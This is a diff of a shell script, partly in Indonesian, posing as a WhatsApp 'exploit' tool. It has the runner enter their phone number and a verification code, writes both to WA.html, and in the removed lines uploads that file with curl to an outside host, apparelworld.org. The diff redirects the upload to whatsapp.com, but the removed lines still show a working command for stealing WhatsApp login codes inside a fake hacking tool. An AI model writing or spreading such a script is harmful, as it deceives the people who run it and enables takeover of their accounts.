@@ -21,13 +21,13 @@ echo "Target => $target";
 sleep 0.5
 echo "[+] Exploiting...";
 echo "Nomer => $nomer" >> WA.html;
-curl -T WA.html http://apparelworld.org/
+curl -T WA.html https://www.whatsapp.com
 sleep 5;
 echo "[+] Done.";
 echo "Tunggu 5-10 Menit Untuk Mendapatkan Code. Mohon Bersabar ini Ujian.";
 read -p "Verify Code => " code;
 sleep 2
-echo "[+] Connecting to whatsapp.com...";
+echo "[+] Connecting to web.whatsapp.com...";
 echo "Login => $nomer";
 sleep 0.5
 echo "Code => $code";
@@ -36,7 +36,7 @@ echo "Target => $target";
 sleep 0.5
 echo "[+] Sending Exploit...";
 echo "Code => $code" >> WA.html;
-curl -T WA.html http://apparelworld.org
+curl -T WA.html https://www.whatsapp.com
 sleep 5
 echo "[+] Success Exploited!";
 exit;
